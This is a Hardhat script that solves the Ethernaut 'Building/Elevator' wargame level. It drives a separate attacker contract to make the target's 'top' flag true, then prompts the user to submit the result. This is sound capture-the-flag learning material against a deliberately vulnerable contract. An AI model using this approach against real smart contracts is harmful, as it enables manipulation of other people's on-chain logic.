import { ethers } from "hardhat";

const attackBuilding = async () => {
    // change contract addresses here.
    const buildingAddress = "0x5d4D6D9b06CFb497D559355429AA7f9dd351AB62"; //type "await contract.address()" in ethernaut console
    // AttackBuilding address = "0x44d67b486C68c1273871a5De10DD3fe2E8df4714";

    // Don't touch below 🚀
    // Can alter last floor by using another contract
    // Additional read about interface:
    // site
    // typing all commands in console below
    // type contract.abi in ethernaut to expose all ABI (change this only if there was an update in ethernaut and this is no longer the same)
    const ABI = [
        {
            inputs: [],
            name: "top",
            outputs: [{ internalType: "bool", name: "", type: "bool" }],
            stateMutability: "view",
            type: "function",
        },
    ];
    const attack = await ethers.getContract("AttackBuilding");
    const contract = await ethers.getContractAt(ABI, buildingAddress);
    const tx1 = await attack.isLastFloor();
    const tx1Receipt = await tx1.wait();
    console.log(tx1Receipt);
    const tx2 = await attack.goToTop();
    const tx2Receipt = await tx2.wait();
    console.log(tx2Receipt);
    const success = await contract.top();
    console.log(`Top: ${success}`);
    if (success) {
        console.log("Congrats! Submit to ethernaut.");
    } else {
        console.log("Sorry, review code and try again...");
    }
};

attackBuilding()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
